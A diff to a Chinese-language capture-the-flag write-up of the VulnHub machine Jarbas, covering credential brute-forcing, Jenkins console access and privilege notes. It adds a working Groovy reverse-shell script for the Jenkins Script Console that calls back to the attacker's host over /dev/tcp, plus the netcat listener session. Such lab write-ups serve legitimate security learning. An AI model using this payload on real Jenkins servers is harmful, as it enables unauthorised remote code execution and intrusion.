@@ -6,15 +6,17 @@ tags:
   - jarbas
   - WriteUp
 categories: WriteUp
-description: 本文记录了作者在通关vulnhub靶机JARBAS中遇到的问题以及踩坑后的解决方案。（摘要补充）
+description: 本文记录了作者在通关vulnhub靶机JARBAS中遇到的问题，通过目录爆破发现 Jenkins 后台登录界面，并爆破密码获取登录凭据，通过 pipline ACL 漏洞写入反弹shell获取立足点。
 top_img: https://pic.imgdb.cn/item/647cc8931ddac507ccbda697.jpg
 cover: https://pic.imgdb.cn/item/647cc8931ddac507ccbda697.jpg
 ---
-
 ## 靶机详情
 
 靶机地址：192.168.118.135
 
+>If you want to keep your hacking studies, please try out this machine!
+Jarbas 1.0 – A tribute to a nostalgic Brazilian search engine in the end of 90’s.
+Objective: Get root shell!
 ## 信息搜集
 
 按照常规的方法：通过 TCP | UDP 扫描端口、获取开放端口对应信息、系统版本信息
@@ -104,7 +106,7 @@ Disallow: /
 
 发现作者的提示：“we don't want robots to click "build" links .” 但目前仍然没有可以利用的地方。
 
-### 获取立足点
+## 获取立足点
 
 ### hash爆破后台凭据
 
@@ -127,21 +129,68 @@ eder:vipsu
 
 ~~因为前两个登录8080端口后台都失败了，我以为这条路又走不通。在兜兜转转徘徊了半小时之后，又回来尝试这个攻击向量，才发现自己的失误。~~
 
-### 失败尝试
+### 发现服务框架 Jenkins
 
 登录之后，浏览后台管理界面，发现存在一个“Build History”的页面，仔细观察后，发现url链接的尾部就是"build"，这难免就让人想到之前 `robots` 中给出的提示，因此针对性分析一下这个板块。
 
 ![pic1](https://pic.imgdb.cn/item/653b5cbcc458853aef1cfab2.jpg)
 
-然后当我后知后觉的去查询CMS的时候，才发现这是 Jenkins 系统<sup>[①](#Jenkins-用户手册)</sup>，翻看 Jenkins 文档后尝试使用 Jenkins Pipeline 写入后门。
+然后当我后知后觉的去查询CMS的时候，才发现这是 Jenkins 系统<sup>[①](#Jenkins-介绍)</sup>，翻看 Jenkins 文档后尝试使用 Jenkins Pipeline 写入后门。
 
 ### CI/CD 工具反弹Shell
 
+查询资料之后了解到 Jenkins 是通过 Groovy 语言<sup>[②](#Groovy-语言)</sup>来执行 pipeline 的。同时再翻看系统设置之后，发现了 Script Console 模块，根据以往的渗透经验和直觉，我猜测此处应该可以反弹shell。但是因为现学 Groovy 语言需要学习成本，我就暂时搁置这个工具向量，去寻找有没有现成的脚本利用。
 
 
+![Script Console](https://pic.imgdb.cn/item/6540e286c458853aefd08a36.jpg)
+
+随后又使用 Searchsploit 搜索了一下 Jenkins 漏洞，发现该版本确实存在 ACL 漏洞，但是直接使用 MSF 脚本却没打进去，大概是因为靶机 Jenkins 服务运行在8080端口，未成功设置 `RHOST` 和 `Target` 。
+
+于是回头继续研究 Groovy 语言，最终根据其语法构造了下面的脚本在 Script Console 反弹shell：
+
+``` groovy
+r = Runtime.getRuntime()
+p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/192.168.213.129/10234;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
+p.waitFor()
+```
+
+![Reverse Shell](https://pic.imgdb.cn/item/6540e209c458853aefcf3345.jpg)
+
+
+反弹shell成功获取jenkins账号权限，之后顺手提升一下终端稳定性，方便之后提权。
+
+```
+$ rlwrap nc -lvnp 10234
+listening on [any] 10234 ...
+connect to [192.168.213.129] from (UNKNOWN) [192.168.213.132] 46900
+/bin/bash -i
+bash: no job control in this shell
+bash-4.2$ ps -p $$
+ps -p $$
+   PID TTY          TIME CMD
+  1701 ?        00:00:00 bash
+bash-4.2$ python -c 'import pty; pty.spawn("/bin/bash")'
+python -c 'import pty; pty.spawn("/bin/bash")'
+bash-4.2$ export TERM=xterm
+export TERM=xterm
+bash-4.2$ stty raw -echo
+stty raw -echo
+bash-4.2$ whoami
+jenkins
+bash-4.2$
+```
+
+## 总结
+
+Jarbas 靶机对于我来说稍微有点难度，主要在于：
+
+1. 爆破密码时即使有提示，却在前两个凭据未成功时放弃尝试，未能坚持继续深入，浪费了时间；
+2. Jenkins 这种 CI&CD 软件我了解不多，学习 Groovy 语法，调试反弹shell的时候耽搁了不少时间；
+
+不过这个靶机也给我带来了不少收获，尤其是对于渗透测试时如何根据渗透经验来选择攻击向量，有了更深的心得体会，也总算能够体会到渗透时灵光一现的直觉判断了，这给了我极大的鼓励和欣喜。
 ## 注释
 
-### Jenkins 用户手册
+### Jenkins 介绍
 
 [Jenkins](https://www.jenkins.io/zh/doc/) 是一款开源 CI&CD 软件，用于自动化各种任务，包括构建、测试和部署软件。Jenkins 支持各种运行方式，可通过系统包、Docker 或者通过一个独立的 Java 程序。
 
@@ -165,4 +214,7 @@ Jenkins 的主要功能包括：
 
 8. **安全性**：Jenkins 具有用户身份验证和授权机制，可以管理用户对不同任务的访问权限。
 
-Jenkins通常用于敏捷开发环境中，以实现持续集成和持续交付 (CI/CD) 目标，帮助开发团队更快地构建、测试和部署软件，同时提高软件质量。它是一个强大的工具，广泛用于开发和DevOps团队中。
+Jenkins 通常用于敏捷开发环境中，以实现持续集成和持续交付 (CI/CD) 目标，帮助开发团队更快地构建、测试和部署软件，同时提高软件质量。它是一个强大的工具，广泛用于开发和 DevOps 团队中。
+
+### Groovy 语言
+
